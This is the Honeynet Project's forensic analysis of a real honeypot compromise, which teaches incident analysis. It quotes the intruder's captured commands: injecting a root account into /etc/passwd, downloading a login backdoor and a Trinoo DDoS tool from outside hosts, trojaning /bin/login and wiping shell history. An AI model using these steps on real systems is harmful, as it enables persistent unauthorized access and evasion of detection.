@@ -1,0 +1,661 @@
+<html>
+<head>
+   <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+   <meta name="keywords" content="hacking,security,script kiddie,exploits,scans,black hat,root,tools,methods">
+   <title>Forensic Analysis</title>
+
+<style type="text/css">
+<!--
+a:active {  text-decoration: none}
+a:hover {  text-decoration: none}
+a:link {  text-decoration: none}
+a:visited {  text-decoration: none}
+-->
+</style>
+</head>
+<body link="#0000FF">
+
+<center>
+<font face="Palatino,Book Antiqua"><font size=+4>Know Your Enemy: <br>
+A Forensic Analysis</font></font>
+<br><i><font size=+1>The Study of an Attack</font></i>
+<p>
+<font face="Palatino,Book Antiqua"><font size=-1>
+<a href="mailto:project@honeynet.org?Subject=Forensic Analysis">Honeynet Project</a>
+<br>
+<a href="http://project.honeynet.org">http://project.honeynet.org</a>
+</font></font>
+<br>Last Modified: 23 May 2000
+</center>
+
+<p>
+<font face="Arial, Helvetica, sans-serif" size="2">
+This paper is a continuation of the 
+<a href="../enemy/index.html">Know
+Your Enemy</a> series. The first three papers covered the tools and tactics
+of the black-hat community.&nbsp; This paper, the fourth of the series,
+studies step by step a successful attack of a system.&nbsp;&nbsp;&nbsp;
+However, instead of focusing on the tools and tactics used, we will focus
+on how we learned what happened and pieced the information together.&nbsp;
+The purpose is to give you the forensic skills necessary to analyze and
+learn on your own the threats your organization faces.  There is also an
+<a href="http://www.msnbc.com/news/437641.asp">online, interactive version</a>
+of this paper published by MSNBC.
+<p>
+<b><font face="Palatino,Book Antiqua"><font size=+2>Background</font></font></b>
+<br>The information covered here was obtained through the use of a 
+<a href="../honeypot/index.html">honeypot</a>.&nbsp;
+The honeypot was a default server installation of Red Hat 6.0.&nbsp; No
+modifications were made to the default install, so the vulnerabilities
+discussed here exist on any default RH 6.0 installation.&nbsp; Also, none 
+of the data presented here has been sanitized.&nbsp; All IP addresses,
+user accounts, and keystrokes discussed here are real.&nbsp; This is done
+on purpose to both validate the data and give a better understanding of
+forensic analysis.&nbsp;&nbsp; Only the passwords have been modified to 
+protect the compromised systems. All sniffer information presented here is
+in snort format.&nbsp; <a href="http://www.snort.org">
+Snort</a> is my sniffer
+and IDS system of choice, due to its flexibility, capabilities, and price
+(its free).&nbsp; All actions commited by the black-hat were captured with
+snort. I use the IDS signatures supplied by Max Vision at 
+<a href="http://www.whitehats.com">www.whitehats.com</a>.&nbsp;
+You can query his arachNIDs database for more information on all the alerts
+discussed throughout this paper.&nbsp; You can find my snort configuration and
+signature file (including the command line options I use)
+<a href="../forensics/snort.txt">here</a>.
+Once you are done reading the paper, you can conduct your own forensic
+analysis, as I have supplied all the <a href="../forensics/forensics.tar.gz">raw
+data.</a>&nbsp; As you read this paper, take note of how many different
+systems the black-hat uses.&nbsp; Also, throughout this paper, the black-hat
+is identified as she, but we have no idea what the true gender is.
+<br>
+
+<p>
+<b><font face="Palatino,Book Antiqua"><font size=+2>The Attack</font></font></b>
+<br>On 26 April, at 06:43 snort alerted me that one of my systems had be attacked
+with a 'noop' attack.&nbsp; Packet payloads containing noops are an indication
+of a buffer overflow attack.&nbsp; In this case, snort had detected the
+attack and logged the alert to my /var/log/messages file (which is monitored
+by <a href="http://www.enteract.com/~lspitz/swatch.html">swatch</a>).  Note:
+throughout this paper, the IP address 172.16.1.107 is the IP address of the honeypot.
+All other systems are the IP addresses used by the black-hat.
+
+<p>
+<font face="Courier New,Courier"><font color="#000000"><font size=-1>
+Apr 26 06:43:05 lisa snort[6283]: <a href="http://www.whitehats.com/IDS/181">IDS181/nops-x86</a>:
+63.226.81.13:1351 -> 172.16.1.107:53</font></font></font>
+
+<p>
+My honeypots receive numerous probes, scans and queries on a 
+<a href="../forensics/probed.txt">daily
+basis</a>.&nbsp; However, an alert like this gets my immediate attention,
+as it indicates a system may have been compromised.&nbsp; Sure enough,
+less then two minutes later system logs indicate the system is compromised,
+as our attacker initiates a connection and logins to the box.
+
+<p>
+<font face="Courier New,Courier"><font color="#000000"><font size=-1>
+Apr 26 06:44:25 victim7 PAM_pwdb[12509]: (login) session opened for user twin by (uid=0)<br>
+Apr 26 06:44:36 victim7 PAM_pwdb[12521]: (su) session opened for user hantu by twin(uid=506)
+</font></font></font>
+
+<p>
+Our intruder has gained super user access and now controls the system.&nbsp;
+How was this accomplished, what happened?&nbsp; We will now begin our forensic
+analysis and put the pieces together, step by step.
+
+<p>
+<b><font face="Palatino,Book Antiqua"><font size=+2>The Analysis</font></font></b>
+<br>
+When studying an attack, the best place to start is the beginning,
+where did the black-hat start?&nbsp; Black-hats normally start with information
+gathering, they need to determine what vulnerabilities exist before they
+can strike.&nbsp; If your system has been compromised, this is normally
+not the first time the black-hat has communicated with that system.&nbsp;
+Most attacks involve some type of&nbsp; information gathering before the
+attack is launched.&nbsp; So, this is where we will start, the black-hat's
+information gathering stage.
+<p>
+If we look at the alert above, the attack was on port 53.&nbsp; This
+indicates a DNS attack was launched on our system.&nbsp; So I will begin
+by looking through my <a href="../forensics/probed.txt">snort
+alerts</a> and find possible information probes for DNS.&nbsp; We find
+a DNS version query probe coming from the same system that attacked us.
+
+<p>
+<font face="Courier New,Courier"><font color="#000000"><font size=-1>
+Apr 25 02:08:07 lisa snort[5875]: <a href="http://dev.whitehats.com/IDS/277">
+IDS277/DNS-version-query</a>: 63.226.81.13:4499 -> 172.16.1.107:53<br>
+Apr 25 02:08:07 lisa snort[5875]: <a href="http://dev.whitehats.com/IDS/277">
+IDS277/DNS-version-query</a>: 63.226.81.13:4630 -> 172.16.1.101:53<br>
+</font></font></font>
+
+<p>
+Notice the date of the probe, April 25.&nbsp; Our system was attacked
+April 26, from the same system.&nbsp; Our system was compromised the day
+after the probe.&nbsp; I am guessing that an automated tool was used by
+our black-hat to scan numerous systems for a known <a href="http://www.cert.org/advisories/CA-2000-03.html">
+DNS vulnerability.</a>&nbsp; After the scan was ran, the black-hat reviewed
+the results, identified vulnerable systems (including ours) and then launched
+her exploit.&nbsp; We have now pieced together the first part of our story.&nbsp;
+Our black-hat scanned us on 25 April, then exploited the system the following
+day.&nbsp; Based on our IDS alerts, it appears we were hit by a 
+<a href="../enemy/index.html">script
+kiddie</a> with a well known DNS vulnerability.&nbsp; But how was the attack
+launched, and how does it work?&nbsp; Lets find out.
+
+<p>
+<b><font face="Palatino,Book Antiqua"><font size=+2>The Exploit</font></font></b>
+<br>
+Like most commercial IDS systems, snort has the capability of showing
+us the packet load data of all IP packets.&nbsp; We will use this capability
+to conduct an analysis of the exploit.&nbsp; The exploit information was
+obtained from the snort logs (stored in tcpdump binary format).&nbsp; I
+queried the snort log and began reviewing the packets starting when the
+attack was launched.&nbsp; I did not limit my information query to the
+host 63.236.81.13, as the attacker may have used other systems.&nbsp; This
+is in fact the case, as our black-hat used at least three different systems
+to run the exploit. The goal of the exploit is to gain a root shell on
+the remote system.&nbsp; Once the black-hat gains a root shell, they can
+run any command as root.&nbsp; Normally an account is placed in the /etc/passwd
+and /etc/shadow file.&nbsp; You can find both the exploit and remote commands
+executed in the <a href="../forensics/exploit.html">detailed
+forensic analysis</a>.&nbsp; Once the exploit was ran and a root shell
+obtained, the following commands were ran as root.
+
+<p>
+<font face="Courier New,Courier"><font color="#000000"><font size=-1>
+cd /; uname -a; pwd; id;<br>
+Linux apollo.uicmba.edu 2.2.5-15 #1 Mon Apr 19 22:21:09 EDT 1999 i586 unknown<br>
+/<br>
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)<br>
+echo "twin::506:506::/home/twin:/bin/bash" >> /etc/passwd<br>
+echo "twin:w3nT2H0b6AjM2:::::::" >> /etc/shadow<br>
+<p>
+echo "hantu::0:0::/:/bin/bash" >> /etc/passwd<br>
+echo "hantu:w3nT2H0b6AjM2:::::::" >> /etc/shadow<br>
+</font></font></font>
+
+<p>
+Our black-hat runs several commands as root.&nbsp;
+First, she confirms the system she is on (<b><font face="Courier New,Courier"><font size=-1>uname
+-a</font></font></b>), the directory (<b><font face="Courier New,Courier"><font size=-1>pwd</font></font></b>)
+and then confirms her uid (<b><font face="Courier New,Courier"><font size=-1>id</font></font></b>).&nbsp;
+She then adds two user accounts to the system, <i>twin</i> and <i>hantu</i>,
+both with the same password.&nbsp; Note that <i>twin</i> has the UID of
+506 and <i>hantu</i> has the UID of 0 (on a side note, <i>hantu</i> means
+ghost in Indonesian).&nbsp; Remeber, most systems do not let UID 0 telnet
+to the box.  So she had to create an account that would give her remote
+access, then another account that would give her UID 0. So, our black-hat 
+ran an exploit on DNS, gained a root shell, then inserted two accounts.&nbsp; 
+Within 90 seconds of the exploit she telnets into the box and gains root access (see timestamps of
+logs below). So, what does she do next?
+
+<p>
+<font face="Courier New,Courier"><font color="#000000"><font size=-1>
+Apr 26 06:43:05 lisa snort[6283]: <a href="http://www.whitehats.com/IDS/181">IDS181/nops-x86</a>:
+63.226.81.13:1351 -> 172.16.1.107:53<br>
+Apr 26 06:44:25 victim7 PAM_pwdb[12509]: (login) session opened for user twin by (uid=0)<br>
+Apr 26 06:44:36 victim7 PAM_pwdb[12521]: (su) session opened for user hantu by twin(uid=506)<br>
+</font></font></font>
+
+<p>
+<b><font face="Palatino,Book Antiqua"><font size=+2>Gaining Access</font></font></b>
+<br>
+Fortunately for us, telnet is a plaintext protocol, the data is not
+encrypted.&nbsp; This means we can decode the sniffer traces and capture
+all the her keystrokes.&nbsp; Snort has already done this for us, another reason
+I prefer snort.&nbsp; By analyzing the keystrokes snort captured of the
+telnet sessions, we can determine what our black-hat does.&nbsp; What I
+like best about decoding telnet sessions as we capture not only STDIN (the
+keystrokes) but STDOUT and STDER.&nbsp; Lets review the telnet sessions
+and identify the black-hats activities (comments in
+<b><font color="#CC0000">RED</font></b>).
+
+<p>
+<font color="#CC0000">
+First, our friend telnets to the box (from 213.28.22.189)
+as <i>twin</i> and then gains superuser access as <i>hantu</i>.  Remeber, she cannot
+just telnet in as <i>hantu</i> as UID 0 is restricted for remote access.</font>
+
+<p>
+<font face="Courier New,Courier"><font size=-1>
+#' !"'!"# ' 9600,9600'VT5444VT5444<br>
+Red Hat Linux release 6.0 (Shedwig)<br>
+Kernel 2.2.5-15 on an i586<br>
+login: twin<br>
+Password: Password: hax0r<br>
+No directory /home/twin!<br>
+Logging in with home = "/".<br>
+[twin@apollo /]$ su hantu<br>
+Password: Password: hax0r<br>
+</font></font>
+<p>
+<font color="#CC0000">
+Next, our friend ftps to another system to get her toolkit.</font>
+<p>
+<font face="Courier New,Courier"><font size=-1>
+[root@apollo /]# ftp 24.112.167.35<br>
+Connected to 24.112.167.35.<br>
+220 linux FTP server (Version wu-2.5.0(1) Tue Sep 21 16:48:12 EDT 1999) ready.<br>
+Name (24.112.167.35:twin): welek<br>
+331 Password required for welek.<br>
+Password:password<br>
+230 User welek logged in.<br>
+Remote system type is UNIX.<br>
+Using binary mode to transfer files.<br>
+ftp> get bj.c<br>
+local: bj.c remote: bj.c<br>
+200 PORT command successful.<br>
+150 Opening BINARY mode data connection for bj.c (1010 bytes).<br>
+226 Transfer complete.<br>
+1010 bytes received in 0.115 secs (8.6 Kbytes/sec)<br>
+ftp> quit<br>
+221-You have transferred 1010 bytes in 1 files.<br>
+221-Total traffic for this session was 1421 bytes in 1 transfers.<br>
+221-Thank you for using the FTP service on linux.<br>
+221 Goodbye.<br>
+</font></font>
+
+<p>
+<font color="#CC0000">
+Third, she grabs her backdoor, compiles 
+<a href="../forensics/bj.txt">bj.c,</a>
+and installs it as a replacement for /sbin/login. Notice all the commands executed
+at the command prompt for the compile.  It appears that all the compile commands were
+executed 'cut and paste' style.  </font>
+
+<p>
+<font face="Courier New,Courier"><font size=-1>
+[root@apollo /]# gcc -o login bj.cchown root:bin loginchmod 4555 loginchmod u-w logincp /bin/login
+/usr/bin/xstatcp /bin/login /usr/bin/old&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rm /bin/loginchmod 555 /usr/bin/xstatchgrp bin /usr/bin/xstatmv login /bin/loginrm
+bj.cgcc -o login bj.c<br>
+bj.c:16: unterminated string or character constant<br>
+bj.c:12: possible real start of unterminated constant<br>
+</font></font>
+<p>
+<font color="#CC0000">
+She now attempts to implement the compiled backdoor</font>
+<p>
+<font face="Courier New,Courier"><font size=-1>
+[root@apollo /]# chown root:bin login<br>
+chown: login: No such file or directory<br>
+root@apollo /]# chmod 4555 login<br>
+chmod: login: No such file or directory<br>
+root@apollo /]# chmod u-w login<br>
+chmod: login: No such file or directory<br>
+root@apollo /]# cp /bin/login /usr/bin/xstat<br>
+root@apollo /]# cp /bin/login /usr/bin/old<br>
+root@apollo /]# rm /bin/login<br>
+root@apollo /]# chmod 555 /usr/bin/xstat<br>
+root@apollo /]# chgrp bin /usr/bin/xstat<br>
+root@apollo /]# mv login /bin/login<br>
+mv: login: No such file or directory<br>
+root@apollo /]# rm bj.c<br>
+</font></font>
+
+<p>
+<font color="#CC0000">
+Dooh! She just can't get it right, lets try again. She ftp's to the site re-downloads the
+backdoor.</font>
+
+<p>
+<font face="Courier New,Courier"><font size=-1>
+[root@apollo /]# ftp 24.112.167.35<br>
+Connected to 24.112.167.35.<br>
+220 linux FTP server (Version wu-2.5.0(1) Tue Sep 21 16:48:12 EDT 1999) ready.<br>
+Name (24.112.167.35:twin): [root@apollo /]#&nbsp;&nbsp; ftp 24.112.167.35<br>
+Connected to 24.112.167.35.<br>
+220 linux FTP server (Version wu-2.5.0(1) Tue Sep 21 16:48:12 EDT 1999) ready.<br>
+Name (24.112.167.35:twin): welek<br>
+331 Password required for welek.<br>
+Password:331 Password required for welek.<br>
+Password:password<br>
+230 User welek logged in.<br>
+Remote system type is UNIX.<br>
+Using binary mode to transfer files.<br>
+ftp> get bj.c<br>
+qulocal: bj.c remote: bj.c<br>
+200 PORT command successful.<br>
+u150 Opening BINARY mode data connection for bj.c (1011 bytes).<br>
+226 Transfer complete.<br>
+1011 bytes received in 0.134 secs (7.3 Kbytes/sec)<br>
+ftp> itit<br>
+221-You have transferred 1011 bytes in 1 files.<br>
+221-Total traffic for this session was 1422 bytes in 1 transfers.<br>
+221-Thank you for using the FTP service on linux.<br>
+221 Goodbye.<br>
+</font></font>
+
+<p>
+<font color="#CC0000">
+This is now her second attempt at compiling the backdoor.  Notice the exact
+same "cut and paste" commands are used. </font>
+<p>
+<font face="Courier New,Courier"><font size=-1>
+[root@apollo /]# gcc -o login bj.cchown root:bin loginchmod 4555 loginchmod u-w logincp /bin/login
+/usr/bin/xstatcp /bin/login /usr/bin/old&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+rm /bin/loginchmod 555 /usr/bin/xstatchgrp bin /usr/bin/xstatmv login /bin/login rm bj.cgcc -o login bj.c<br>
+bj.c: In function `owned':<br>
+bj.c:16: warning: assignment makes pointer from integer without a cast<br>
+</font></font></font>
+
+<p> 
+<font face="Arial, Helvetica, sans-serif" size="2"><font color="#CC0000">
+Now we see the compiled backdoor implemented.  The valid copy of 
+/bin/login is moved to /usr/bin/xstat, while the compiled trojan 
+<a href="../forensics/bj.txt">bj.c</a>
+is used to replace /bin/login.  This is the backdoor. This trojan
+allows anyone with the TERM setting of vt9111 unauthorized access.
+</font></font>
+
+<P>
+<font face="Courier New,Courier"><font size=-1>
+[root@apollo /]# chown root:bin login<br>
+root@apollo /]# chmod 4555 login<br>
+root@apollo /]# chmod u-w login<br>
+root@apollo /]# cp /bin/login /usr/bin/xstat<br>
+cp: /bin/login: No such file or directory<br>
+root@apollo /]# cp /bin/login /usr/bin/old<br>
+cp: /bin/login: No such file or directory<br>
+root@apollo /]# rm /bin/login<br>
+rm: cannot remove `/bin/login': No such file or directory<br>
+root@apollo /]# chmod 555 /usr/bin/xstat<br>
+root@apollo /]# chgrp bin /usr/bin/xstat<br>
+root@apollo /]# mv login /bin/login<br>
+</font></font>
+
+<p>
+<font face="Arial, Helvetica, sans-serif" size="2"><font color="#CC0000">
+Now she covers her moves.&nbsp; I believe this is scripted, cut and paste.&nbsp;
+Look at all the commands she executed at a single command prompt.&nbsp;
+Also, I believe this is a 'generic' clean up script, notice how it tries
+to remove files that do not exist (such as /tmp/h).</font></font>
+
+<p>
+<font face="Courier New,Courier"><font size=-1>
+[root@apollo /]# rm bj.c<br>
+[root@apollo /]# [root@apollo /]# ps -aux | grep inetd ; ps -aux | grep portmap ; rm /sbin/portmap ;
+rm /tmp/h ; rm /usr/sbin/rpc.portmap ; rm -rf .bash* ; rm -rf /root/.bash_history
+; rm -rf /usr/sbin/namedps -aux | grep inetd ; ps -aux | grep portmap ;
+rm /sbin/por&lt;grep inetd ; ps -aux | grep portmap ; rm /sbin/port&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+map ; rm /tmp/h ; rm /usr&lt;p portmap ; rm /sbin/portmap ; rm /tmp/h ;
+rm /usr/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+sbin/rpc.portmap ; rm -rf&lt;ap ; rm /tmp/h ; rm /usr/sbin/rpc.portmap
+; rm -rf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+.bash* ; rm -rf /root/.ba&lt;bin/rpc.portmap ; rm -rf .bash* ; rm -rf /root/.bas&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+h_history ; rm -rf /usr/s&lt;bash* ; rm -rf /root/.bash_history ; rm -rf
+/usr/sb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+in/named<br>
+359 ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 00:00:00 inetd<br>
+359 ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 00:00:00 inetd<br>
+rm: cannot remove `/tmp/h': No such file or directory<br>
+rm: cannot remove `/usr/sbin/rpc.portmap': No such file or directory<br>
+[root@apollo /]# ps -aux | grep portmap<br>
+[root@apollo /]# [root@apollo /]# ps -aux | grep inetd ; ps -aux | grep portmap ; rm /sbin/portmap ;
+rm /tmp/h ; rm /usr/sbin/rpc.portmap ; rm -rf .bash* ; rm -rf /root/.bash_history
+; rm -rf /usr/sbin/namedps -aux | grep inetd ; ps -aux | grep portmap ;
+rm /sbin/por&lt;grep inetd ; ps -aux | grep portmap ; rm /sbin/port&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+map ; rm /tmp/h ; rm /usr&lt;p portmap ; rm /sbin/portmap ; rm /tmp/h ;
+rm /usr/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+sbin/rpc.portmap ; rm -rf&lt;ap ; rm /tmp/h ; rm /usr/sbin/rpc.portmap
+; rm -rf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+.bash* ; rm -rf /root/.ba&lt;bin/rpc.portmap ; rm -rf .bash* ; rm -rf /root/.bas&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+h_history ; rm -rf /usr/s&lt;bash* ; rm -rf /root/.bash_history ; rm -rf
+/usr/sb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+in/named<br>
+359 ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 00:00:00 inetd<br>
+rm: cannot remove `/sbin/portmap': No such file or directory<br>
+rm: cannot remove `/tmp/h': No such file or directory<br>
+>rm: cannot remove `/usr/sbin/rpc.portmap': No such file or directory<br>
+[root@apollo /]# rm: cannot remove `/sbin/portmap': No such file or directory<br>
+
+<p>
+<font color="#CC0000"><font face="Arial, Helvetica, sans-serif" size="2">
+I find this interesting.  Our black-hat's generic clean up script generated 
+errors as it attempted to remove files that did not exist.  I belive our blackhat 
+saw these errors and became concerened, because she then attempts to manually 
+remove these same files, even though they do not exist.
+</font></font>
+
+<p>
+<font face="Courier New,Courier"><font size=-1>
+rm: cannot remove `/tmp/h': No such file or directory<br>
+rm: cannot remove `/usr/sbin/rpc.portmap': No such file or directory<br>
+root@apollo /]# rm: cannot remove `/sbin/portmap': No such file or directory<br>
+rm: cannot remove `/tmp/h': No such file or directory<br>
+rm: cannot remove `/usr/sbin/rpc.portmap': No such file or directory<br>
+root@apollo /]# exit<br>
+exit<br>
+twin@apollo /]$ exit<br>
+logout<br>
+</font></font>
+
+<p>
+<font face="Arial, Helvetica, sans-serif" size="2"><font color="#CC0000">
+That's it, our friend has installed a backdoor, 
+<a href="../forensics/bj.txt">bj.c</a>.&nbsp;
+The backdoor allows unauthenticated users in based on the TERM setting, in
+this case VT9111.&nbsp; Once completed, she logged out from the system.
+</font>
+
+<p>
+After leaving the system, the black hat made several
+more connections and modificaitons to the systems.&nbsp; Review the raw
+data to review the black-hats keystrokes.</font>
+
+<p>
+<b><font face="Palatino,Book Antiqua"><font size=+2>Trinoo, The Return</font></font></b>
+<br>
+<font face="Arial, Helvetica, sans-serif" size="2">
+Once the system had been compromised, I took it offline to review the
+data (such as Tripwire).&nbsp; However, I noticed over the next week that
+a variety of systems were attempting to telnet to the box.&nbsp; Apparently
+the black-hat wanted back in, most likely to use the compromised system
+for more nefarious activity.&nbsp; So, I brought the compromised box back
+online, curious to see if the black-hat would return and what she would
+do.&nbsp; Sure enough, almost two weeks later, she returned.&nbsp; Once
+again, we captured all the keystrokes using snort.&nbsp; Review the following
+telnet sessions and learn how our compromised system was to be used as
+a <a href="http://staff.washington.edu/dittrich/misc/trinoo.analysis">Trinoo client</a>.
+
+<p>
+<font color="#CC0000">
+On May 9, 10:45 am, our friend telnets in from 24.7.85.192.&nbsp; Note how
+she uses the backdoor VT9111 to get into the system, bypassing authentication.
+</font></font></font>
+
+<pre>
+ !"' #'!"# ' 9600,9600'VT9111VT9111 
+Red Hat Linux release 6.0 (Shedwig) 
+Kernel 2.2.5-15 on an i586 
+[root@apollo /]# ls 
+bin   cdrom  etc     home  lost+found  proc  sbin  usr 
+boot  dev    floppy  lib   mnt         root  tmp   var 
+</pre>
+
+<font face="Arial, Helvetica, sans-serif" size="2"><font color="#CC0000">
+Once on the system, she attempts to use DNS.  However, DNS is still broken on the box. 
+Remember, DNS was exploited to gain root access, so the system can no longer resolve domain
+names. 
+</font>
+
+<p>
+<font face="Courier New,Courier"><font size=-1>
+[root@apollo /]# nslookup magix<br>
+[root@apollo /]# nslookup irc.powersurf.com<br>
+Server:&nbsp; zeus-internal.uicmba.edu<br>
+Address:&nbsp; 172.16.1.101<br>
+</font></font>
+
+<p>
+<font color="#CC0000">
+The black-hat ftp's to a system in Singapore and downloads a new tool kit.&nbsp;
+Notice the 'hidden' directory .s she creates to store the toolkit.
+</font>
+
+<p>
+<font face="Courier New,Courier"><font size=-1>
+[root@apollo /]# mkdir .s<br>
+root@apollo /]# cd .s<br>
+root@apollo /.s]# ftp nusnet-216-35.dynip.nus.edu.sg<br>
+ftp: nusnet-216-35.dynip.nus.edu.sg: Unknown host<br>
+ftp> qquituit<br>
+root@apollo /.s]# ftpr 137.132.216.35<br>
+login: ftrp: command not found<br>
+root@apollo /.s]#<br>
+root@apollo /.s]# ftp 137.132.216.35<br>
+Connected to 137.132.216.35.<br>
+220 nusnet-216-35.dynip.nus.edu.sg FTP server (Version wu-2.4.2-VR17(1) Mon Apr 19 09:21:53 EDT 1999) ready.<br>
+</font></font>
+
+<p>
+<font color="#CC0000">
+She gains access with the same user name that was inserted in our box.
+</font>
+<p>
+<font face="Courier New,Courier"><font size=-1>
+Name (137.132.216.35:root): twin<br>
+331 Password required for twin.<br>
+Password:hax0r<br>
+230 User twin logged in.<br>
+Remote system type is UNIX.<br>
+Using binary mode to transfer files.<br>
+ftp> get d.tar.gz<br>
+local: d.tar.gz remote: d.tar.gz<br>
+200 PORT command successful.<br>
+150 Opening BINARY mode data connection for d.tar.gz (8323 bytes).<br>
+150 Opening BINARY mode data connection for d.tar.gz (8323 bytes).<br>
+226 Transfer complete.<br>
+8323 bytes received in 1.36 secs (6 Kbytes/sec)<br>
+ftp> quit<br>
+221-You have transferred 8323 bytes in 1 files.<br>
+221-Total traffic for this session was 8770 bytes in 1 transfers.<br>
+221-Thank you for using the FTP service on nusnet-216-35.dynip.nus.edu.sg.<br>
+221 Goodbye.<br>
+[root@apollo /.s]# gunzip d*<br>
+[root@apollo /.s]# tar -xvf d*<br>
+daemon/<br>
+daemon/ns.c<br>
+daemon/ns<br>
+[root@apollo /.s]# rm -rf d.tar<br>
+root@apollo /.s]# cd daemon<br>
+[root@apollo daemon]# chmod u+u+x nsx ns<br>
+root@apollo daemon]# ./ns<br>
+</font></font>
+<p>
+<font color="#CC0000">
+Our black-hat has just installed and started Trinoo client.&nbsp; Next, she
+attempts to hop to another compromised system.&nbsp; Notice how she sets
+her VT TERM.&nbsp; This system most likely also has a backdoor.&nbsp; The
+connection fails since DNS is not working.</font>
+
+<p>
+<font face="Courier New,Courier"><font size=-1>
+[root@apollo daemon]# TERM=vt1711<br>
+[root@apollo daemon]# telnet macau.hkg.com<br>
+macau.hkg.com: Unknown host<br>
+root@apollo daemon]# exit<br>
+exit<br>
+</font></font>
+
+<p>
+<font color="#CC0000">
+Our friend leaves, only to return later from yet a different system (137.132.216.35)
+and attempt more michief.</font>
+
+<p>
+<font face="Courier New,Courier"><font size=-1>
+!"' #'!"# ' 9600,9600'VT9111VT9111<br>
+Red Hat Linux release 6.0 (Shedwig)<br>
+Kernel 2.2.5-15 on an i586<br>
+[apollo /]# TERM=vt9111<br>
+telnet ns2.cpcc.cc.nc.us<br>
+ns2.cpcc.cc.nc.us: Unknown host<br>
+apollo /}#telnet 1 152.43.29.52<br>
+Trying 152.43.29.52...<br>
+Connected to 152.43.29.52.<br>
+Escape character is '^]'.<br>
+Connection closed by foreign host.<br>
+[root@apollo /]# TERM=vt7877<br>
+[root@apollo /]# telnet sparky.w<br>
+[root@apollo /]# exit<br>
+exit
+</font></font>
+
+<p>
+<font color="#CC0000">
+Following this, several attempts were made to use the system as a Trinoo
+attack against other systems. At this point I disconnected the system.&nbsp;
+The black-hat intended to use the compromised system for destructive purposes
+and little more could be gained from the monitoring the connection.
+</font>
+
+<p>
+<font face="Courier New,Courier"><font size=-1>
+May 9 11:03:20 lisa snort[2370]: <a href="http://www.whitehats.com/IDS/197">IDS/197/trin00-master-to-daemon:</a> 137.132.17.202:2984 -> 172.16.1.107:27444<br>
+May 9 11:03:20 lisa snort[2370]: <a href="http://www.whitehats.com/IDS/187">IDS187/trin00-daemon-to-master-pong:</a> 172.16.1.107:1025 -> 137.132.17.202:31335<br>
+May 9 11:26:04 lisa snort[2370]: <a href="http://www.whitehats.com/IDS/197">IDS197/trin00-master-to-daemon:</a>
+137.132.17.202:2988 -> 172.16.1.107:27444<br>
+May 9 11:26:04 lisa snort[2370]: <a href="http://www.whitehats.com/IDS/187">IDS187/trin00-daemon-to-master-pong:</a> 172.16.1.107:1027 -> 137.132.17.202:31335<br>
+May 9 20:48:14 lisa snort[2370]: <a href="http://www.whitehats.com/IDS/197">IDS197/trin00-master-to-daemon:</a>
+137.132.17.202:3076 -> 172.16.1.107:27444<br>
+May 9 20:48:14 lisa snort[2370]: <a href="http://www.whitehats.com/IDS/187">IDS187/trin00-daemon-to-master-pong:</a> 172.16.1.107:1028 -> 137.132.17.202:31335<br>
+</font></font>
+
+<p>
+<b><font face="Palatino,Book Antiqua"><font size=+2>Summary</font></font></b>
